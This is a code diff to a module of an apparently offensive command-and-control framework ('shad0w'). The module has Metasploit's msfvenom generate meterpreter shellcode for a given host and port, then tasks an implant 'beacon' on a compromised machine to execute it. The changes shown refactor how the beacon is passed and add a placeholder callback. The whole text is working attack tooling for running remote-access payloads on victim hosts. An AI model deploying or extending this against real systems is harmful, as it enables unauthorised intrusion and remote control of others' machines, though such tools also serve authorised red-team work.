@@ -11,9 +11,16 @@ __author__ = "@Flangvik"
 
 EXEC_ID = 0x3000
 
+# beacon to exec command on
+current_beacon = None
+
 class DummyClass(object):
     def __init__(self):
         pass
+
+def meterpreter_callback(shad0w, data):
+    # nothin to do
+    return ""
 
 # let argparse error and exit nice
 def error(message):
@@ -29,7 +36,7 @@ def exit(status=0, message=None):
 def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch):
 
     # Print some info
-    shad0w.debug.log(f"Metasploit is building the shellcode...", log=True)
+    shad0w.event.beacon_info(current_beacon, f"Metasploit is building the shellcode...")
 
     # put us in the correct dir (inside docker)
     os.chdir("/root/shad0w/bin/metasploit")
@@ -48,12 +55,11 @@ def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch):
     return shellCodeB64
 
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.error("ERROR: No active beacon")
-        return
+    # make beacon global
+    current_beacon = beacon
 
     # init the parser
     parser = argparse.ArgumentParser(prog='meterpreter',formatter_class=argparse.RawDescriptionHelpFormatter, epilog="")
@@ -87,4 +93,5 @@ def main(shad0w, args):
     rcode = msfvenom_payload_gen(shad0w, payload = args.payload, lport = args.port, lhost = args.host, arch="x64")
 
     # set a task for the current beacon to do
-    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
+    shad0w.beacons[current_beacon]["task"] = (EXEC_ID, rcode)
+    shad0w.beacons[current_beacon]["callback"] = meterpreter_callback
